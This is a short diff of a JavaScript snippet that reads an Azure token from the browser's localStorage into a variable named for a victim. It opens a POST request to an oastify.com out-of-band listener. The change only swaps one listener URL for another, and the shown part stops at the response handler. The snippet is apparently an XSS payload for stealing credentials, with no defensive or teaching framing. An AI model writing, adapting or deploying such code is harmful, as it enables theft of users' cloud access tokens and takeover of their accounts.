@@ -1,6 +1,6 @@
 var victimAzureToken=localStorage.getItem('azure_token');
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
+xhr.open("POST", "https://ivhnd24t2banpblz0nikcr460x6ouei3.oastify.com", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onreadystatechange = function() {
